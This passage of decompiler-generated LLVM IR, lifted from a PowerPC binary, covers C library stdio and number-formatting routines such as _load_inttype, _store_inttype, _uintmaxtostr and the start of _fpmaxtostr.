  %v1_1000cb50 = add i32 %v0_1000cb4c, 16
  %v2_1000cb50 = inttoptr i32 %v1_1000cb50 to i32*
  %v3_1000cb50 = load i32, i32* %v2_1000cb50, align 4
  store i32 %v3_1000cb50, i32* %r9.global-to-local, align 4
  %v4_1000cb54 = icmp eq i32 %v3_1000cb4c, %v3_1000cb50
  br i1 %v4_1000cb54, label %dec_label_pc_1000cb5c, label %dec_label_pc_1000cb64

dec_label_pc_1000cb5c:                            ; preds = %dec_label_pc_1000cb4c
  %v1_1000cb5c = and i32 %v3_1000cb10, 2
  store i32 %v1_1000cb5c, i32* %r0.global-to-local, align 4
  %v3_1000cb5c = icmp eq i32 %v1_1000cb5c, 0
  br i1 %v3_1000cb5c, label %dec_label_pc_1000cb84, label %dec_label_pc_1000cb64

dec_label_pc_1000cb64:                            ; preds = %dec_label_pc_1000cb4c, %dec_label_pc_1000cb5c
  %v1_1000cb64 = and i32 %v3_1000cb10, 1024
  store i32 %v1_1000cb64, i32* %r9.global-to-local, align 4
  %v0_1000cb6c = call i32 @__asm_mfcr()
  store i32 %v0_1000cb6c, i32* %r3.global-to-local, align 4
  %v1_1000cb70 = call i32 @__asm_rlwinm(i32 %v0_1000cb6c, i32 3, i32 31, i32 31)
  %v1_1000cb74 = sub i32 2, %v1_1000cb70
  store i32 %v1_1000cb74, i32* @r5, align 4
  store i32 268487548, i32* @lr, align 4
  %v1_1000cb78 = call i32 @__GI_fseek(i32 %v1_1000cb74)
  store i32 %v1_1000cb78, i32* %r3.global-to-local, align 4
  %v3_1000cb7c = icmp eq i32 %v1_1000cb78, 0
  br i1 %v3_1000cb7c, label %dec_label_pc_1000cb64.dec_label_pc_1000cb84_crit_edge, label %dec_label_pc_1000cb28

dec_label_pc_1000cb64.dec_label_pc_1000cb84_crit_edge: ; preds = %dec_label_pc_1000cb64
  %v0_1000cb84.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000cb84

dec_label_pc_1000cb84:                            ; preds = %dec_label_pc_1000cb64.dec_label_pc_1000cb84_crit_edge, %dec_label_pc_1000cb44, %dec_label_pc_1000cb5c
  %v0_1000cb84 = phi i32 [ %v0_1000cb84.pre, %dec_label_pc_1000cb64.dec_label_pc_1000cb84_crit_edge ], [ %v0_1000cb4c, %dec_label_pc_1000cb44 ], [ %v0_1000cb4c, %dec_label_pc_1000cb5c ]
  %v1_1000cb84 = inttoptr i32 %v0_1000cb84 to i16*
  %v2_1000cb84 = load i16, i16* %v1_1000cb84, align 2
  %v3_1000cb84 = zext i16 %v2_1000cb84 to i32
  store i32 %v3_1000cb84, i32* %r0.global-to-local, align 4
  %v1_1000cb88 = add i32 %v0_1000cb84, 8
  %v2_1000cb88 = inttoptr i32 %v1_1000cb88 to i32*
  %v3_1000cb88 = load i32, i32* %v2_1000cb88, align 4
  store i32 %v3_1000cb88, i32* %r9.global-to-local, align 4
  %v1_1000cb8c = call i32 @__asm_rlwinm(i32 %v3_1000cb84, i32 0, i32 0, i32 29)
  %v2_1000cb8c = trunc i32 %v1_1000cb8c to i16
  store i32 %v1_1000cb8c, i32* %r0.global-to-local, align 4
  %v3_1000cb90 = load i32, i32* @r31, align 4
  %v4_1000cb90 = inttoptr i32 %v3_1000cb90 to i16*
  store i16 %v2_1000cb8c, i16* %v4_1000cb90, align 2
  %v0_1000cb94 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000cb94 = load i32, i32* @r31, align 4
  %v2_1000cb94 = add i32 %v1_1000cb94, 20
  %v3_1000cb94 = inttoptr i32 %v2_1000cb94 to i32*
  store i32 %v0_1000cb94, i32* %v3_1000cb94, align 4
  %v0_1000cb98 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000cb98 = load i32, i32* @r31, align 4
  %v2_1000cb98 = add i32 %v1_1000cb98, 24
  %v3_1000cb98 = inttoptr i32 %v2_1000cb98 to i32*
  store i32 %v0_1000cb98, i32* %v3_1000cb98, align 4
  %v0_1000cb9c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000cb9c = load i32, i32* @r31, align 4
  %v2_1000cb9c = add i32 %v1_1000cb9c, 16
  %v3_1000cb9c = inttoptr i32 %v2_1000cb9c to i32*
  store i32 %v0_1000cb9c, i32* %v3_1000cb9c, align 4
  %v0_1000cba0.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000cba0

dec_label_pc_1000cba0:                            ; preds = %dec_label_pc_1000cb3c, %dec_label_pc_1000cb84
  %v2_1000cbac = phi i32 [ %v0_1000cb4c, %dec_label_pc_1000cb3c ], [ %v0_1000cba0.pre, %dec_label_pc_1000cb84 ]
  %v1_1000cba0 = inttoptr i32 %v2_1000cbac to i16*
  %v2_1000cba0 = load i16, i16* %v1_1000cba0, align 2
  %v3_1000cba0 = zext i16 %v2_1000cba0 to i32
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1000cba8 = or i32 %v3_1000cba0, 64
  store i32 %v1_1000cba8, i32* %r0.global-to-local, align 4
  %v1_1000cbac = trunc i32 %v1_1000cba8 to i16
  store i16 %v1_1000cbac, i16* %v1_1000cba0, align 2
  %v0_1000cbb0 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000cbb0 = urem i32 %v0_1000cbb0, 65536
  store i32 %v1_1000cbb0, i32* %r0.global-to-local, align 4
  %v1_1000cbb4 = and i32 %v0_1000cbb0, 2816
  store i32 %v1_1000cbb4, i32* %r9.global-to-local, align 4
  %v3_1000cbb4 = icmp eq i32 %v1_1000cbb4, 0
  br i1 %v3_1000cbb4, label %dec_label_pc_1000cbbc, label %dec_label_pc_1000cbc4

dec_label_pc_1000cbbc:                            ; preds = %dec_label_pc_1000cba0
  %v0_1000cbbc = load i32, i32* @r31, align 4
  %v1_1000cbbc = add i32 %v0_1000cbbc, 12
  %v2_1000cbbc = inttoptr i32 %v1_1000cbbc to i32*
  %v3_1000cbbc = load i32, i32* %v2_1000cbbc, align 4
  store i32 %v3_1000cbbc, i32* %r0.global-to-local, align 4
  %v2_1000cbc0 = add i32 %v0_1000cbbc, 28
  %v3_1000cbc0 = inttoptr i32 %v2_1000cbc0 to i32*
  store i32 %v3_1000cbbc, i32* %v3_1000cbc0, align 4
  br label %dec_label_pc_1000cbc4

dec_label_pc_1000cbc4:                            ; preds = %dec_label_pc_1000cba0, %dec_label_pc_1000cb28, %dec_label_pc_1000cbbc
  store i32 %v0_1000cae0, i32* %r0.global-to-local, align 4
  store i32 %v0_1000cae8, i32* @r31, align 4
  %v0_1000cbd4 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000cbd4

; uselistorder directives
  uselistorder i32 %v0_1000cbb0, { 1, 0 }
  uselistorder i32 %v1_1000cb8c, { 1, 0 }
  uselistorder i32 %v0_1000cb84, { 1, 0 }
  uselistorder i32 %v0_1000cb4c, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v4_1000caf4, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 4, 2, 3, 1, 5, 6, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15 }
  uselistorder i32 1024, { 5, 6, 7, 8, 1, 2, 3, 0, 4 }
  uselistorder i16* %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000cbc4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000cba0, { 1, 0 }
  uselistorder label %dec_label_pc_1000cb84, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000cb64, { 1, 0 }
  uselistorder label %dec_label_pc_1000cb1c, { 1, 0 }
  uselistorder label %dec_label_pc_1000cb10, { 1, 0 }
}

define i32 @_load_inttype(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v0_1000cbd8 = load i32, i32* @r5, align 4
  %v1_1000cbd8 = icmp slt i32 %v0_1000cbd8, 0
  %v1_1000cbdc = call i32 @__asm_rlwinm(i32 %arg1, i32 0, i32 20, i32 20)
  %v3_1000cc18 = icmp eq i32 %v1_1000cbdc, 0
  br i1 %v1_1000cbd8, label %dec_label_pc_1000cc18, label %dec_label_pc_1000cbe4

dec_label_pc_1000cbe4:                            ; preds = %entry
  br i1 %v3_1000cc18, label %dec_label_pc_1000cbec, label %dec_label_pc_1000cc20

dec_label_pc_1000cbec:                            ; preds = %dec_label_pc_1000cbe4
  %v3_1000cbec = icmp eq i32 %arg1, 256
  br i1 %v3_1000cbec, label %dec_label_pc_1000cbf8, label %dec_label_pc_1000cc00

dec_label_pc_1000cbf8:                            ; preds = %dec_label_pc_1000cbec
  br label %dec_label_pc_1000cc0c

dec_label_pc_1000cc00:                            ; preds = %dec_label_pc_1000cbec
  %v3_1000cc00 = icmp eq i32 %arg1, 512
  br i1 %v3_1000cc00, label %dec_label_pc_1000cc08, label %dec_label_pc_1000cc0c

dec_label_pc_1000cc08:                            ; preds = %dec_label_pc_1000cc00
  br label %dec_label_pc_1000cc0c

dec_label_pc_1000cc0c:                            ; preds = %dec_label_pc_1000cc00, %dec_label_pc_1000cbf8, %dec_label_pc_1000cc08
  ret i32 0

dec_label_pc_1000cc18:                            ; preds = %entry
  br i1 %v3_1000cc18, label %dec_label_pc_1000cc2c, label %dec_label_pc_1000cc20

dec_label_pc_1000cc20:                            ; preds = %dec_label_pc_1000cbe4, %dec_label_pc_1000cc18
  %v2_1000cc20 = load i32, i32* %arg2, align 4
  ret i32 %v2_1000cc20

dec_label_pc_1000cc2c:                            ; preds = %dec_label_pc_1000cc18
  %v3_1000cc2c = icmp eq i32 %arg1, 256
  %v2_1000cc30 = load i32, i32* %arg2, align 4
  br i1 %v3_1000cc2c, label %dec_label_pc_1000cc38, label %dec_label_pc_1000cc40

dec_label_pc_1000cc38:                            ; preds = %dec_label_pc_1000cc2c
  %v1_1000cc38 = urem i32 %v2_1000cc30, 256
  br label %dec_label_pc_1000cc4c

dec_label_pc_1000cc40:                            ; preds = %dec_label_pc_1000cc2c
  %v3_1000cc40 = icmp eq i32 %arg1, 512
  br i1 %v3_1000cc40, label %dec_label_pc_1000cc48, label %dec_label_pc_1000cc4c

dec_label_pc_1000cc48:                            ; preds = %dec_label_pc_1000cc40
  %v1_1000cc48 = mul i32 %v2_1000cc30, 65536
  %v2_1000cc48 = sdiv i32 %v1_1000cc48, 65536
  br label %dec_label_pc_1000cc4c

dec_label_pc_1000cc4c:                            ; preds = %dec_label_pc_1000cc40, %dec_label_pc_1000cc38, %dec_label_pc_1000cc48
  %v0_1000cc4c = phi i32 [ %v2_1000cc30, %dec_label_pc_1000cc40 ], [ %v1_1000cc38, %dec_label_pc_1000cc38 ], [ %v2_1000cc48, %dec_label_pc_1000cc48 ]
  %tmp = icmp slt i32 %v0_1000cc4c, 0
  %v1_1000cc50 = zext i1 %tmp to i32
  %v2_1000cc50 = ashr i32 %v0_1000cc4c, 31
  %v3_1000cc50 = and i32 %v2_1000cc50, -2
  %v4_1000cc50 = or i32 %v3_1000cc50, %v1_1000cc50
  ret i32 %v4_1000cc50

; uselistorder directives
  uselistorder i32 %v0_1000cc4c, { 1, 0 }
  uselistorder i32 %v2_1000cc30, { 2, 0, 1 }
  uselistorder i1 %v3_1000cc18, { 1, 0 }
  uselistorder i32 %arg1, { 2, 4, 0, 1, 3 }
  uselistorder label %dec_label_pc_1000cc4c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000cc20, { 1, 0 }
  uselistorder label %dec_label_pc_1000cc0c, { 2, 0, 1 }
}

define i32 @_store_inttype(i16* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i16* %arg1 to i32
  %v0_1000cc58 = load i32, i32* @r4, align 4
  %v3_1000cc58 = icmp eq i32 %v0_1000cc58, 256
  br i1 %v3_1000cc58, label %dec_label_pc_1000cc64, label %dec_label_pc_1000cc6c

dec_label_pc_1000cc64:                            ; preds = %entry
  %v0_1000cc64 = load i32, i32* @r6, align 4
  %v1_1000cc64 = trunc i32 %v0_1000cc64 to i8
  %tmp1 = bitcast i16* %arg1 to i8*
  store i8 %v1_1000cc64, i8* %tmp1, align 1
  ret i32 %tmp

dec_label_pc_1000cc6c:                            ; preds = %entry
  %v3_1000cc5c = icmp eq i32 %v0_1000cc58, 2048
  br i1 %v3_1000cc5c, label %dec_label_pc_1000cc74, label %dec_label_pc_1000cc80

dec_label_pc_1000cc74:                            ; preds = %dec_label_pc_1000cc6c
  %v0_1000cc74 = load i32, i32* @r5, align 4
  %tmp2 = bitcast i16* %arg1 to i32*
  store i32 %v0_1000cc74, i32* %tmp2, align 4
  %v0_1000cc78 = load i32, i32* @r6, align 4
  %v3_1000cc78 = add i32 %tmp, 4
  %v4_1000cc78 = inttoptr i32 %v3_1000cc78 to i32*
  store i32 %v0_1000cc78, i32* %v4_1000cc78, align 4
  ret i32 %tmp

dec_label_pc_1000cc80:                            ; preds = %dec_label_pc_1000cc6c
  %v3_1000cc6c = icmp eq i32 %v0_1000cc58, 512
  %v0_1000cc84 = load i32, i32* @r6, align 4
  br i1 %v3_1000cc6c, label %dec_label_pc_1000cc84, label %dec_label_pc_1000cc8c

dec_label_pc_1000cc84:                            ; preds = %dec_label_pc_1000cc80
  %v1_1000cc84 = trunc i32 %v0_1000cc84 to i16
  store i16 %v1_1000cc84, i16* %arg1, align 2
  ret i32 %tmp

dec_label_pc_1000cc8c:                            ; preds = %dec_label_pc_1000cc80
  %tmp3 = bitcast i16* %arg1 to i32*
  store i32 %v0_1000cc84, i32* %tmp3, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i16* %arg1, { 2, 3, 0, 1, 4 }
}

define i32 @_uintmaxtostr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cr0_eq.global-to-local = alloca i1, align 1
  %r12.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* @r7, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_1000cc94 = load i32, i32* @r7, align 4
  %v3_1000cc94 = icmp eq i32 %v0_1000cc94, 0
  store i1 %v3_1000cc94, i1* %cr0_eq.global-to-local, align 1
  store i32 %arg5, i32* @r30, align 4
  %tmp12 = icmp sgt i32 %v0_1000cc94, -1
  br i1 %tmp12, label %dec_label_pc_1000ccc8, label %dec_label_pc_1000cca8

dec_label_pc_1000cca8:                            ; preds = %entry
  %v0_1000cca8 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000ccac = sub i32 0, %v0_1000cc94
  store i32 %v1_1000ccac, i32* @r7, align 4
  %tmp13 = icmp sgt i32 %v0_1000cca8, -1
  br i1 %tmp13, label %dec_label_pc_1000ccc8, label %dec_label_pc_1000ccb4

dec_label_pc_1000ccb4:                            ; preds = %dec_label_pc_1000cca8
  %v0_1000ccb4 = load i32, i32* %r6.global-to-local, align 4
  %v1_1000ccb4 = sub i32 0, %v0_1000ccb4
  %v2_1000ccb4 = sub i32 -1, %v0_1000ccb4
  store i32 %v1_1000ccb4, i32* %r6.global-to-local, align 4
  %v4_1000ccb4 = icmp uge i32 %v2_1000ccb4, %v1_1000ccb4
  %v1_1000ccb8 = sub i32 -1, %v0_1000cca8
  %v3_1000ccb8 = zext i1 %v4_1000ccb4 to i32
  %v4_1000ccb8 = add i32 %v3_1000ccb8, %v1_1000ccb8
  store i32 %v4_1000ccb8, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000ccc8

dec_label_pc_1000ccc8:                            ; preds = %entry, %dec_label_pc_1000cca8, %dec_label_pc_1000ccb4
  %v1_1000cccc = phi i32 [ %v1_1000ccac, %dec_label_pc_1000ccb4 ], [ %v1_1000ccac, %dec_label_pc_1000cca8 ], [ %v0_1000cc94, %entry ]
  %storemerge = phi i32 [ 1, %dec_label_pc_1000ccb4 ], [ 0, %dec_label_pc_1000cca8 ], [ 0, %entry ]
  store i32 %storemerge, i32* @r29, align 4
  %v2_1000cccc = udiv i32 -1, %v1_1000cccc
  store i32 %v2_1000cccc, i32* @r8, align 4
  %v2_1000ccd4 = load i32, i32* %r3.global-to-local, align 4
  %v3_1000ccd4 = inttoptr i32 %v2_1000ccd4 to i8*
  store i8 0, i8* %v3_1000ccd4, align 1
  %v0_1000ccd8 = load i32, i32* @r8, align 4
  %v1_1000ccd8 = load i32, i32* @r7, align 4
  %v2_1000ccd8 = mul i32 %v1_1000ccd8, %v0_1000ccd8
  %v1_1000ccdc = sub i32 0, %v2_1000ccd8
  store i32 %v1_1000ccdc, i32* @r31, align 4
  %v4_1000cce0 = icmp eq i32 %v1_1000ccd8, %v1_1000ccdc
  br i1 %v4_1000cce0, label %dec_label_pc_1000cce8, label %dec_label_pc_1000ccf0

dec_label_pc_1000cce8:                            ; preds = %dec_label_pc_1000ccc8
  %v1_1000cce8 = add i32 %v0_1000ccd8, 1
  store i32 %v1_1000cce8, i32* @r8, align 4
  store i32 0, i32* @r31, align 4
  br label %dec_label_pc_1000ccf0

dec_label_pc_1000ccf0:                            ; preds = %dec_label_pc_1000ccc8, %dec_label_pc_1000cce8
  %v0_1000ccf0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1000ccf0, i32* %r12.global-to-local, align 4
  br label %dec_label_pc_1000ccf4

dec_label_pc_1000ccf4thread-pre-split:            ; preds = %dec_label_pc_1000cd48
  %v0_1000ccf4.pr = load i32, i32* %r12.global-to-local, align 4
  %v1_1000ccf8.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1000ccf4

dec_label_pc_1000ccf4:                            ; preds = %dec_label_pc_1000ccf4thread-pre-split, %dec_label_pc_1000ccf0
  %v1_1000cd3c = phi i32 [ %v1_1000ccf8.pre, %dec_label_pc_1000ccf4thread-pre-split ], [ %v1_1000ccd8, %dec_label_pc_1000ccf0 ]
  %v1_1000cd0c = phi i32 [ %v0_1000ccf4.pr, %dec_label_pc_1000ccf4thread-pre-split ], [ %v0_1000ccf0, %dec_label_pc_1000ccf0 ]
  %v3_1000ccf4 = icmp eq i32 %v1_1000cd0c, 0
  %v0_1000ccf8 = load i32, i32* %r6.global-to-local, align 4
  %v2_1000ccf8 = udiv i32 %v0_1000ccf8, %v1_1000cd3c
  br i1 %v3_1000ccf4, label %dec_label_pc_1000cd3c, label %dec_label_pc_1000cd00

dec_label_pc_1000cd00:                            ; preds = %dec_label_pc_1000ccf4
  %v2_1000cd00 = udiv i32 %v1_1000cd0c, %v1_1000cd3c
  %v2_1000cd04 = mul i32 %v2_1000cd00, %v1_1000cd3c
  %v2_1000cd08 = mul i32 %v2_1000ccf8, %v1_1000cd3c
  %v2_1000cd0c = sub i32 %v1_1000cd0c, %v2_1000cd04
  store i32 %v2_1000cd00, i32* %r12.global-to-local, align 4
  %v0_1000cd14 = load i32, i32* @r31, align 4
  %v2_1000cd14 = mul i32 %v0_1000cd14, %v2_1000cd0c
  %v2_1000cd18 = sub i32 %v0_1000ccf8, %v2_1000cd08
  %v2_1000cd1c = add i32 %v2_1000cd14, %v2_1000cd18
  %v0_1000cd20 = load i32, i32* @r8, align 4
  %v2_1000cd20 = mul i32 %v0_1000cd20, %v2_1000cd0c
  %v2_1000cd24 = udiv i32 %v2_1000cd1c, %v1_1000cd3c
  %v2_1000cd28 = add i32 %v2_1000cd20, %v2_1000ccf8
  %v2_1000cd2c = mul i32 %v2_1000cd24, %v1_1000cd3c
  %v2_1000cd30 = add i32 %v2_1000cd28, %v2_1000cd24
  store i32 %v2_1000cd30, i32* %r6.global-to-local, align 4
  %v2_1000cd34 = sub i32 %v2_1000cd1c, %v2_1000cd2c
  store i32 %v2_1000cd34, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000cd48

dec_label_pc_1000cd3c:                            ; preds = %dec_label_pc_1000ccf4
  %v2_1000cd3c = mul i32 %v2_1000ccf8, %v1_1000cd3c
  %v2_1000cd40 = sub i32 %v0_1000ccf8, %v2_1000cd3c
  store i32 %v2_1000cd40, i32* %r5.global-to-local, align 4
  store i32 %v2_1000ccf8, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1000cd48

dec_label_pc_1000cd48:                            ; preds = %dec_label_pc_1000cd00, %dec_label_pc_1000cd3c
  %v1_1000cd4c = phi i32 [ %v2_1000cd00, %dec_label_pc_1000cd00 ], [ 0, %dec_label_pc_1000cd3c ]
  %v0_1000cd4c = phi i32 [ %v2_1000cd30, %dec_label_pc_1000cd00 ], [ %v2_1000ccf8, %dec_label_pc_1000cd3c ]
  %v0_1000cd50 = phi i32 [ %v2_1000cd34, %dec_label_pc_1000cd00 ], [ %v2_1000cd40, %dec_label_pc_1000cd3c ]
  %v2_1000cd4c = or i32 %v0_1000cd4c, %v1_1000cd4c
  %v5_1000cd4c = icmp eq i32 %v2_1000cd4c, 0
  store i1 %v5_1000cd4c, i1* %cr0_eq.global-to-local, align 1
  %v1_1000cd54 = load i32, i32* @r30, align 4
  %v0_1000cd58 = load i32, i32* %r3.global-to-local, align 4
  %v1_1000cd58 = add i32 %v0_1000cd58, -1
  store i32 %v1_1000cd58, i32* %r3.global-to-local, align 4
  %tmp14 = icmp ult i32 %v0_1000cd50, 10
  %v1_1000cd50.v2_1000cd54.v = select i1 %tmp14, i32 48, i32 %v1_1000cd54
  %v1_1000cd50.v2_1000cd54 = add i32 %v0_1000cd50, %v1_1000cd50.v2_1000cd54.v
  %extract.t9.extract.t = trunc i32 %v1_1000cd50.v2_1000cd54 to i8
  %v3_1000cd68 = inttoptr i32 %v1_1000cd58 to i8*
  store i8 %extract.t9.extract.t, i8* %v3_1000cd68, align 1
  %v0_1000cd6c = load i1, i1* %cr0_eq.global-to-local, align 1
  br i1 %v0_1000cd6c, label %dec_label_pc_1000cd70, label %dec_label_pc_1000ccf4thread-pre-split

dec_label_pc_1000cd70:                            ; preds = %dec_label_pc_1000cd48
  %v0_1000cd70 = load i32, i32* @r29, align 4
  %v3_1000cd70 = icmp eq i32 %v0_1000cd70, 0
  br i1 %v3_1000cd70, label %dec_label_pc_1000cd70.dec_label_pc_1000cd80_crit_edge, label %dec_label_pc_1000cd78

dec_label_pc_1000cd70.dec_label_pc_1000cd80_crit_edge: ; preds = %dec_label_pc_1000cd70
  %v0_1000cd88.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000cd80

dec_label_pc_1000cd78:                            ; preds = %dec_label_pc_1000cd70
  %v2_1000cd7c = load i32, i32* %r3.global-to-local, align 4
  %v3_1000cd7c = add i32 %v2_1000cd7c, -1
  %v4_1000cd7c = inttoptr i32 %v3_1000cd7c to i8*
  store i8 45, i8* %v4_1000cd7c, align 1
  store i32 %v3_1000cd7c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000cd80

dec_label_pc_1000cd80:                            ; preds = %dec_label_pc_1000cd70.dec_label_pc_1000cd80_crit_edge, %dec_label_pc_1000cd78
  %v0_1000cd88 = phi i32 [ %v0_1000cd88.pre, %dec_label_pc_1000cd70.dec_label_pc_1000cd80_crit_edge ], [ %v3_1000cd7c, %dec_label_pc_1000cd78 ]
  ret i32 %v0_1000cd88

; uselistorder directives
  uselistorder i32 %v2_1000cd00, { 1, 2, 0 }
  uselistorder i32 %v2_1000ccf8, { 3, 4, 0, 1, 2 }
  uselistorder i32 %v1_1000cd3c, { 0, 1, 4, 2, 3, 5, 6 }
  uselistorder i32 %v1_1000ccd8, { 1, 2, 0 }
  uselistorder i32 %v0_1000ccd8, { 1, 0 }
  uselistorder i32 %v0_1000cc94, { 1, 2, 0, 3 }
  uselistorder i32* %r6.global-to-local, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32* %r5.global-to-local, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32* %r3.global-to-local, { 2, 4, 3, 6, 5, 0, 1 }
  uselistorder i8 45, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_1000cd80, { 1, 0 }
  uselistorder label %dec_label_pc_1000cd48, { 1, 0 }
  uselistorder label %dec_label_pc_1000ccf0, { 1, 0 }
  uselistorder label %dec_label_pc_1000ccc8, { 2, 1, 0 }
}

define i32 @_fpmaxtostr(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cr6_eq.global-to-local = alloca i1, align 1
  %cr6_gt.global-to-local = alloca i1, align 1
  %cr6_lt.global-to-local = alloca i1, align 1
  %cr7_eq.global-to-local = alloca i1, align 1
  %cr7_lt.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %tmp54 = call i32 @__decompiler_undefined_function_0()
  %tmp55 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-200 = alloca i8, align 1
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-179 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-177 = alloca i32, align 4
  %stack_var_-159 = alloca i32, align 4
  %stack_var_-178 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %v0_1000cd8c = load i32, i32* @lr, align 4
  store i32 %v0_1000cd8c, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r27, align 4
  store i32 %arg3, i32* @r26, align 4
  %v1_1000cda8 = add i32 %tmp, 11
  %v2_1000cda8 = inttoptr i32 %v1_1000cda8 to i8*
  %v3_1000cda8 = load i8, i8* %v2_1000cda8, align 1
  %v4_1000cda8 = zext i8 %v3_1000cda8 to i32
  store i32 %v4_1000cda8, i32* %r31.global-to-local, align 4
  %v1_1000cdac = or i32 %v4_1000cda8, 32
  %v1_1000cdb0 = icmp ult i32 %v1_1000cdac, 97
  %v3_1000cdb0 = icmp eq i32 %v1_1000cdac, 97
  store i1 %v1_1000cdb0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000cdb0, i1* %cr7_eq.global-to-local, align 1
  store i32 101, i32* %r0.global-to-local, align 4
  %v1_1000cdbc = add i32 %tmp, 4
  %v2_1000cdbc = inttoptr i32 %v1_1000cdbc to i32*
  %v3_1000cdbc = load i32, i32* %v2_1000cdbc, align 4
  store i32 %v3_1000cdbc, i32* %r28.global-to-local, align 4
  %v2_1000cdc0 = load i32, i32* %arg2, align 4
  store i32 %v2_1000cdc0, i32* %r30.global-to-local, align 4
  br i1 %v3_1000cdb0, label %dec_label_pc_1000cdc8, label %dec_label_pc_1000cdd0

dec_label_pc_1000cdc8:                            ; preds = %entry
  %v1_1000cdc8 = add nuw nsw i32 %v4_1000cda8, 6
  store i32 %v1_1000cdc8, i32* %r0.global-to-local, align 4
  %v1_1000cdcc = urem i32 %v1_1000cdc8, 256
  store i32 %v1_1000cdcc, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000cdd0

dec_label_pc_1000cdd0:                            ; preds = %entry, %dec_label_pc_1000cdc8
  %v0_1000ce84 = phi i32 [ %v4_1000cda8, %entry ], [ %v1_1000cdcc, %dec_label_pc_1000cdc8 ]
  %v1_1000cdd0 = icmp slt i32 %v2_1000cdc0, 0
  %v3_1000cdd0 = icmp eq i32 %v2_1000cdc0, 0
  store i1 %v1_1000cdd0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000cdd0, i1* %cr7_eq.global-to-local, align 1
  %tmp75 = icmp sgt i32 %v2_1000cdc0, -1
  br i1 %tmp75, label %dec_label_pc_1000cddc, label %dec_label_pc_1000cdd8

dec_label_pc_1000cdd8:                            ; preds = %dec_label_pc_1000cdd0
  store i32 6, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000cddc

dec_label_pc_1000cddc:                            ; preds = %dec_label_pc_1000cdd0, %dec_label_pc_1000cdd8
  %v0_1000cf9444 = phi i32 [ %v2_1000cdc0, %dec_label_pc_1000cdd0 ], [ 6, %dec_label_pc_1000cdd8 ]
  %v1_1000cddc = add i32 %tmp, 12
  %v2_1000cddc = inttoptr i32 %v1_1000cddc to i32*
  %v3_1000cddc = load i32, i32* %v2_1000cddc, align 4
  store i32 %v3_1000cddc, i32* %r9.global-to-local, align 4
  %v1_1000cde0 = and i32 %v3_1000cddc, 2
  %v3_1000cde0 = icmp eq i32 %v1_1000cde0, 0
  store i32 0, i32* %r0.global-to-local, align 4
  store i8 0, i8* %stack_var_-200, align 1
  br i1 %v3_1000cde0, label %dec_label_pc_1000cdf8, label %dec_label_pc_1000ce04

dec_label_pc_1000cdf8:                            ; preds = %dec_label_pc_1000cddc
  %v1_1000cdf8 = urem i32 %v3_1000cddc, 2
  store i32 %v1_1000cdf8, i32* @r7, align 4
  %v3_1000cdf8 = icmp eq i32 %v1_1000cdf8, 0
  br i1 %v3_1000cdf8, label %dec_label_pc_1000ce08, label %dec_label_pc_1000ce04

